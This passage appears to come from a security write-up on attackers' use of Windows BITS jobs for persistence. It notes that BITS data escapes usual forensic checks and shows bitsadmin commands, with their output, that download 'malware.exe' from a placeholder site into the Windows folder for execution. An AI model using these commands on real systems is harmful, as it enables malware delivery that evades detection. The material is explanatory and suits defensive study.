Since the command data for BITS jobs is stored to a database rather than traditional registry locations, it can be overlooked by tools that attempt to identify persistence executables and commands or by forensic investigators.
BITS jobs can be created using API function calls or via the bitsadmin command line tool.
See Figure 1 and Figure 2 for an example of how a BITS job can be used to download a file and trigger execution.
> bitsadmin /create download > bitsadmin /addfile
download https://<site>/malware.exe c:\\windows\\malware.exe > bitsadmin /resume
download > bitsadmin /complete
download Created job {EA8603EB-7CC2-44EC-B1EE-E9923290C2ED}.
Added https://<site>/malware.exe -> c:\\windows\\malware.exe to job.
Job resumed.
Job completed.
